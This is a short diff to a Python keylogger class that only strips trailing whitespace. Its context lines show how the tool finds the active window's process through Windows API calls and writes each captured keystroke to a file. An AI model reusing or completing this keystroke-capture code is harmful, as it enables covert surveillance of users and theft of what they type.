@@ -22,7 +22,7 @@ class KeyLogger:
         # Pass handle to get the PID of the process
         windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
         process_id = f'{pid.value}'
-        
+
         executable = create_string_buffer(512)
         # Open the process using the handle created
         h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
@@ -63,7 +63,7 @@ class KeyLogger:
                     print(f'{event.Key}')
                     f.write((f'{event.Key}'))
             return True
-    
+
 def run():
     save_stdout = sys.stdout
     # sys.stdout = StringIO()
@@ -78,5 +78,5 @@ def run():
         pythoncom.PumpWaitingMessages()
 
 if __name__ == "__main__":
-    print(run()) 
+    print(run())
     print('Done.')
